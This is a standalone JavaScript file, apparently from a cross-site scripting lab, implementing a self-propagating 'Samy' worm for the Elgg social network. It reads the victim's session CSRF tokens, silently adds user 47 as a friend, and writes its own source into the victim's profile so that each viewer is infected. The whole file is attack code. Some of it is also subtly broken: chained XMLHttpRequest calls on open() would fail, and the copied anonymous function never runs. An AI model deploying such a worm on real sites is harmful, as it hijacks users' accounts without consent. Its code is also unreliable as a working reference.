window.onload = function() {
    var samyGuid = 47;          
    var samyFriendId = 47;      
    var wormMessage = "Samy is my hero! "; 
    
    
    if (elgg.session.user.guid == samyGuid) 
        return;
    
    
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var friendUrl = "/action/friends/add?friend=" + samyFriendId + ts + token;
    
    new XMLHttpRequest().open("GET", friendUrl, true)
        .setRequestHeader("Host", window.location.hostname)
        .setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
        .send();
    
    
    var payload = encodeURIComponent(
        '<script>' + window.onload.toString() + '</script>'
    );
    
    var profileUrl = "/action/profile/edit";
    var profileData = "description=" + payload + 
                      "&accesslevel[description]=2" +
                      "&guid=" + elgg.session.user.guid + 
                      ts + token;
    
    new XMLHttpRequest().open("POST", profileUrl, true)
        .setRequestHeader("Host", window.location.hostname)
        .setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
        .send(profileData);
    
};